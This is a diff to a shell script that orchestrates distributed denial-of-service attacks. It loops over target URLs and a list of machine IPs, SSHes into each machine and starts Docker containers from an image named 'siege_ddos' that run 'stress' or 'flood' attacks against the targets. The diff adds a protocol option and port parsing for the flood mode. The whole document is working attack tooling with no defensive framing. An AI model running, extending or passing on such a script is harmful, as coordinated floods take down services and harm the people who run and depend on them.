@@ -9,6 +9,7 @@ EOF
 url_list=""
 nj="1000"
 attack="stress"
+protocol="TCP"
 while [ "$1" != "" ]; do
     case $1 in
         --url )
@@ -22,6 +23,10 @@ while [ "$1" != "" ]; do
         --attack )
             shift
             attack=$1
+        ;;
+        --protocol )
+            shift
+            protocol=$1
         ;;
         -h | --help ) usage $0
             exit
@@ -50,9 +55,20 @@ nj_per_machine=$(echo $((nj / urls_num)))
 for url in $(cat $url_list); do
   for ip in $(cat $ips_path); do
     if [ "$attack" == "stress" ]; then
-      ssh ubuntu@${ip} docker run -d mack/battle-tools bombardier -c $nj_per_machine -l $url
+      ssh ubuntu@${ip} docker run -d myuatools/siege_ddos bombardier -c $nj_per_machine -l $url
     elif [ "$attack" == "flood" ]; then
-      ssh ubuntu@${ip} docker run -d mack/battle-tools python3 -m siege_engine $nj_per_machine $url
+      url_only=$(echo $url | perl -nle '/(.+)(\:\d+)/; print $1')
+      if [ -z "$url_only" ]; then
+        url_only="$(echo $url)"
+        port=""
+      else
+        port="--port $(echo $url | awk -F':' '{print $NF}')"
+      fi
+      if [[ $url == http* ]]; then
+        echo "for siege - do not prepend url with http(s)"
+	exit 1
+      fi
+      ssh ubuntu@${ip} docker run -d myuatools/siege_ddos python3 -m siege_engine $nj_per_machine $url --protocol $protocol $port
     else
       echo "unknown attack type ${attack}"
     fi
